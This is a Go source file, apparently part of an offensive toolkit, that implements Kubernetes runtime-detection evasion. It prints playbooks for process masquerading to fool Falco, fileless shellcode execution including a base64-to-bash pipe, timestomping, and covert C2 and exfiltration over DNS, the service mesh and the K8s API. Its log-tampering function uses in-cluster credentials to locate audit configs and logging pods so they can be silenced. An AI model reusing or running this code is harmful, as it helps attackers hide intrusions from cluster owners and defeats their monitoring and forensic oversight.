package cloudevasion

import (
	"context"
	"fmt"
	"strings"

	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/rest"
)

func EvadeRuntimeDetection(ctx context.Context, technique string) (*EvasionResult, error) {
	switch technique {
	case "process_masquerade":
		return processMasquerade(ctx)
	case "fileless":
		return filelessExecution(ctx)
	case "log_tampering":
		return logTampering(ctx)
	case "timestomp":
		return timestomp(ctx)
	case "network_hide":
		return networkHide(ctx)
	default:
		return processMasquerade(ctx)
	}
}

func processMasquerade(_ context.Context) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Process Masquerading:\n\n")
	sb.WriteString("  Techniques to disguise malicious processes:\n\n")

	techniques := []struct {
		name   string
		method string
	}{
		{"argv[0] overwrite", "Write legitimate process name to /proc/self/comm"},
		{"LD_PRELOAD hijack", "Inject into legitimate process via LD_PRELOAD"},
		{"memfd_create exec", "Execute from anonymous memory fd (no file on disk)"},
		{"Kernel thread mimic", "Name process as [kworker/0:1] style kernel thread"},
		{"Container runtime mimic", "Rename as containerd-shim or runc process"},
	}

	for _, t := range techniques {
		fmt.Fprintf(&sb, "  [%s]\n    %s\n\n", t.name, t.method)
	}

	sb.WriteString("  Detection blind spots:\n")
	sb.WriteString("    - Falco checks /proc/<pid>/exe which is the actual binary\n")
	sb.WriteString("    - But many rules only check comm/cmdline which we control\n")
	sb.WriteString("    - Container runtime processes are often allowlisted\n")

	return &EvasionResult{
		Technique: "process_masquerade",
		Success:   true,
		Output:    sb.String(),
	}, nil
}

func filelessExecution(_ context.Context) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Fileless Execution Techniques:\n\n")

	sb.WriteString("  1. memfd_create + execveat:\n")
	sb.WriteString("     fd = memfd_create('', MFD_CLOEXEC)\n")
	sb.WriteString("     write(fd, payload, len)\n")
	sb.WriteString("     execveat(fd, '', argv, envp, AT_EMPTY_PATH)\n\n")

	sb.WriteString("  2. /proc/self/mem injection:\n")
	sb.WriteString("     Find RWX region in /proc/self/maps\n")
	sb.WriteString("     Write shellcode via /proc/self/mem at RWX offset\n")
	sb.WriteString("     Jump to injected code\n\n")

	sb.WriteString("  3. shared memory execution:\n")
	sb.WriteString("     shm_open('/dev/shm/payload', O_RDWR|O_CREAT)\n")
	sb.WriteString("     Write ELF, exec via /proc/self/fd/<n>\n")
	sb.WriteString("     unlink immediately\n\n")

	sb.WriteString("  4. Script interpreters:\n")
	sb.WriteString("     Pipe payload to bash/python/perl via stdin\n")
	sb.WriteString("     echo <base64> | base64 -d | bash\n\n")

	sb.WriteString("  Detection evasion:\n")
	sb.WriteString("    - No file write events for Falco to trigger on\n")
	sb.WriteString("    - No inode changes for integrity monitoring\n")
	sb.WriteString("    - No disk forensics artifacts\n")

	return &EvasionResult{
		Technique: "fileless",
		Success:   true,
		Output:    sb.String(),
	}, nil
}

func logTampering(ctx context.Context) (*EvasionResult, error) {
	config, err := rest.InClusterConfig()
	if err != nil {
		return &EvasionResult{Technique: "log_tampering", Success: false, Output: err.Error()}, nil
	}

	client, err := kubernetes.NewForConfig(config)
	if err != nil {
		return &EvasionResult{Technique: "log_tampering", Success: false, Output: err.Error()}, nil
	}

	var sb strings.Builder
	sb.WriteString("Log Tampering Techniques:\n\n")

	sb.WriteString("  1. K8s Audit Log Manipulation:\n")
	cms, err := client.CoreV1().ConfigMaps("kube-system").List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, cm := range cms.Items {
			if strings.Contains(cm.Name, "audit") {
				fmt.Fprintf(&sb, "     Found audit config: %s\n", cm.Name)
			}
		}
	}
	sb.WriteString("     - Modify audit policy to exclude our namespace/user\n")
	sb.WriteString("     - Set level: None for sensitive API paths\n\n")

	sb.WriteString("  2. Container Log Truncation:\n")
	sb.WriteString("     - Overwrite /var/log/containers/<our-pod>*.log\n")
	sb.WriteString("     - Truncate via hostPath volume mount\n")
	sb.WriteString("     - Redirect stdout/stderr to /dev/null\n\n")

	sb.WriteString("  3. Fluentd/Fluent-bit Manipulation:\n")

	logPods, err := client.CoreV1().Pods("").List(ctx, metav1.ListOptions{
		LabelSelector: "app=fluent-bit",
	})
	if err == nil && len(logPods.Items) > 0 {
		fmt.Fprintf(&sb, "     Found %d fluent-bit pods\n", len(logPods.Items))
	}

	logPods, err = client.CoreV1().Pods("").List(ctx, metav1.ListOptions{
		LabelSelector: "app=fluentd",
	})
	if err == nil && len(logPods.Items) > 0 {
		fmt.Fprintf(&sb, "     Found %d fluentd pods\n", len(logPods.Items))
	}

	sb.WriteString("     - Modify ConfigMap to add exclusion filter\n")
	sb.WriteString("     - Drop logs matching our pod/namespace pattern\n")

	return &EvasionResult{
		Technique: "log_tampering",
		Success:   true,
		Output:    sb.String(),
	}, nil
}

func timestomp(_ context.Context) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Timestamp Manipulation:\n\n")
	sb.WriteString("  Modify file timestamps to blend with legitimate files:\n\n")
	sb.WriteString("  Techniques:\n")
	sb.WriteString("    - utimensat() syscall to set atime/mtime to match nearby files\n")
	sb.WriteString("    - Copy timestamps from /usr/bin/ls or similar system binary\n")
	sb.WriteString("    - Set ctime via namespace time manipulation (unshare -t)\n\n")
	sb.WriteString("  Container-specific:\n")
	sb.WriteString("    - Match overlay filesystem layer timestamps\n")
	sb.WriteString("    - Align with container creation time from /proc/1/stat\n")
	sb.WriteString("    - Modify /var/lib/docker/overlay2 metadata\n\n")
	sb.WriteString("  Detection blind spots:\n")
	sb.WriteString("    - File integrity monitoring uses mtime for change detection\n")
	sb.WriteString("    - Timeline forensics rely on accurate timestamps\n")
	sb.WriteString("    - Container image layer verification uses fs timestamps\n")

	return &EvasionResult{
		Technique: "timestomp",
		Success:   true,
		Output:    sb.String(),
	}, nil
}

func networkHide(_ context.Context) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Network Activity Concealment:\n\n")

	sb.WriteString("  1. DNS Tunneling (evades network policy):\n")
	sb.WriteString("     - Encode data in DNS queries to controlled nameserver\n")
	sb.WriteString("     - UDP/53 typically allowed even in strict NetworkPolicies\n")
	sb.WriteString("     - Use legitimate-looking subdomain patterns\n\n")

	sb.WriteString("  2. Service Mesh Abuse:\n")
	sb.WriteString("     - Route C2 through existing Istio VirtualServices\n")
	sb.WriteString("     - Piggyback on legitimate mTLS connections\n")
	sb.WriteString("     - Use Envoy access log as data exfil channel\n\n")

	sb.WriteString("  3. K8s API as Transport:\n")
	sb.WriteString("     - Encode commands in ConfigMap annotations\n")
	sb.WriteString("     - Use Pod labels for small data exfiltration\n")
	sb.WriteString("     - K8s API traffic always allowed from pods\n\n")

	sb.WriteString("  4. Covert Channels:\n")
	sb.WriteString("     - ICMP payload encoding\n")
	sb.WriteString("     - TCP timestamp/sequence manipulation\n")
	sb.WriteString("     - HTTP header steganography in legitimate traffic\n\n")

	sb.WriteString("  Detection blind spots:\n")
	sb.WriteString("    - NetworkPolicy only filters L3/L4, not content\n")
	sb.WriteString("    - mTLS prevents DPI on service mesh traffic\n")
	sb.WriteString("    - K8s API is always trusted internal traffic\n")

	return &EvasionResult{
		Technique: "network_hide",
		Success:   true,
		Output:    sb.String(),
	}, nil
}
